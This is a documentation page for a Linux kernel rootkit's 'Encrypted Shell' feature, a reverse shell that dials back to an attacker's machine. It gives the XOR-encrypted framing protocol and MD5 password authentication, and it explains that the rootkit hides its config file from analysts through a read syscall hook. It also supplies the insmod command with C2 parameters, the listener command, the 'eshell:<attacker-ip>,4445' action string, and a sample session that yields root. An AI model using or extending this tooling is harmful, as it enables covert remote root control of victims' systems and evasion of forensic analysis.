---
title: Encrypted Shell
description: An authenticated, XOR-encrypted interactive shell between the rootkit and the attacker.
---

The encrypted shell provides an authenticated, XOR-encrypted command channel between the rootkit and the attacker. Every byte sent over the wire is encrypted, and the session requires a shared password before any command can be issued. The session runs in a dedicated kthread so the C2 polling loop is not blocked.

## Protocol

```
Attacker                          Rootkit
   |                                 |
   |  <-- TCP connect ────────────── |   rootkit dials attacker:port
   |                                 |
   | ── MD5(password) (16 bytes) ──> |   attacker sends raw MD5 digest
   |                                 |   rootkit decodes its hex digest and
   |                                 |   compares against received bytes
   |                                 |   wrong → rootkit closes connection
   |                                 |   match ↓
   | <── 0x01 ACK (1 byte) ──────── |   rootkit acknowledges authentication
   |                                 |
   | ── [4-byte LE len][XOR data] ─> |   attacker sends encrypted command
   | <── [4-byte LE len][XOR data] ─ |   rootkit sends encrypted result
   |          ... (loop) ...         |
   | ── [frame: "exit"] ───────────> |   session ends (also encrypted frame)
```

Each message in both directions uses the same framing:

```
┌──────────────────────┬──────────────────────────────┐
│  length (4 B, LE)    │  payload XOR key[i % 16]     │
└──────────────────────┴──────────────────────────────┘
```

The XOR key is the raw 16-byte MD5 digest of the shared password.

The rootkit sends back one response frame per command. stdout and stderr are base64-encoded to avoid framing issues with binary output:

```
EXIT:<exit_code>
STDOUT:<base64-encoded stdout>
STDERR:<base64-encoded stderr>
```

## Authentication

The plaintext password is never stored on the victim. When installed via `install.sh`, both the C2 IP and the MD5 digest of the password are written to `/etc/modprobe.d/wlkom.conf`. This file is hidden from user-space reads by the rootkit's `read` syscall hook — even if an analyst opens the file, the hook suppresses its content.

To compute the digest manually:

```sh
echo -n 'mysecret' | md5sum | cut -d' ' -f1
# e.g. → a6e9a0b3f3d6e1f0c0e4b2d1a8f5c3e7
```

When loading the module manually (for debugging):

```sh
insmod src/wlkom.ko c2_host=<C2_IP> eshell_md5_password=a6e9a0b3f3d6e1f0c0e4b2d1a8f5c3e7
```

## Usage

1. Start the listener on the attacking machine **before** sending the action:

```sh
python3 attacking_program/encrypted_shell.py --port 4445 --password mysecret
```

2. From the C2 web UI, open the action modal for the target machine and choose **Encrypted Shell**, or send the raw action string:

```
eshell:<attacker-ip>,4445
```

3. The rootkit connects, authentication completes, and the listener drops into an interactive prompt:

```
[+] Authentication successful!

eshell> id
uid=0(root) gid=0(root) groups=0(root)
eshell> exit
[*] Session closed.
```

<video controls style="width:100%;max-width:800px;display:block;margin:1.5rem auto;border-radius:6px;">
  <source src="/encrypted-reverse-shell.mkv" type="video/x-matroska"/>
</video>
